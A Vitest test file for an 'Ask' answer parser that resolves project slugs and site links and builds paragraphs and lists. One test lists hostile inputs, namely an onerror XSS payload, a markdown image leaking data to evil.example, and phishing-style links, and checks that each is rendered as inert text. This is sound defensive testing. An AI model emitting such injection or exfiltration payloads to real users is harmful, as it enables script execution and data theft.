// Ask answer parser (spec 005, T402, FR-432).
import { describe, expect, it } from 'vitest';
import { type RenderRefs, parseAnswer, parseInline } from '../../../src/core/ask/render.ts';

const REFS: RenderRefs = {
  projects: new Map([['dmns', 'Denver Museum of Nature & Science']]),
  links: new Map([['Email', 'mailto:demo@example.com']]),
};

describe('parseInline (FR-432)', () => {
  it('resolves a known project slug', () => {
    expect(parseInline('See [[dmns]] for more.', REFS)).toEqual([
      { type: 'text', text: 'See ' },
      { type: 'project', slug: 'dmns', title: 'Denver Museum of Nature & Science' },
      { type: 'text', text: ' for more.' },
    ]);
  });

  it('drops an unknown slug', () => {
    expect(parseInline('See [[nope]].', REFS)).toEqual([{ type: 'text', text: 'See .' }]);
  });

  it('resolves a site link by label, and drops an unknown one', () => {
    expect(parseInline('Write [[link:Email]].', REFS)).toContainEqual({
      type: 'link',
      label: 'Email',
      href: 'mailto:demo@example.com',
    });
    expect(parseInline('[[link:Evil]]', REFS)).toEqual([]);
  });

  it.each([
    'Go to https://evil.example/login now',
    '<b>bold</b> <img src=x onerror=alert(1)>',
    '![x](https://evil.example/leak?q=1)',
    '[click](https://evil.example)',
    '[[link:https://evil.example]]',
  ])('keeps %s as inert text', (input) => {
    const parts = parseInline(input, REFS);
    expect(parts.every((p) => p.type === 'text')).toBe(true);
  });
});

describe('parseAnswer (FR-432)', () => {
  it('splits paragraphs on blank lines and joins wrapped lines', () => {
    expect(parseAnswer('One\ntwo.\n\nThree.', REFS)).toEqual([
      { type: 'paragraph', parts: [{ type: 'text', text: 'One two.' }] },
      { type: 'paragraph', parts: [{ type: 'text', text: 'Three.' }] },
    ]);
  });

  it('turns "- " lines into a list', () => {
    expect(parseAnswer('He has:\n- React\n- [[dmns]]', REFS)).toEqual([
      { type: 'paragraph', parts: [{ type: 'text', text: 'He has:' }] },
      {
        type: 'list',
        items: [
          [{ type: 'text', text: 'React' }],
          [{ type: 'project', slug: 'dmns', title: 'Denver Museum of Nature & Science' }],
        ],
      },
    ]);
  });

  it('drops a half token at the end of a cut-off stream', () => {
    expect(parseAnswer('See [[dm', REFS)).toEqual([
      { type: 'paragraph', parts: [{ type: 'text', text: 'See' }] },
    ]);
  });

  it('returns nothing for blank input', () => {
    expect(parseAnswer(' \n\n ', REFS)).toEqual([]);
  });
});
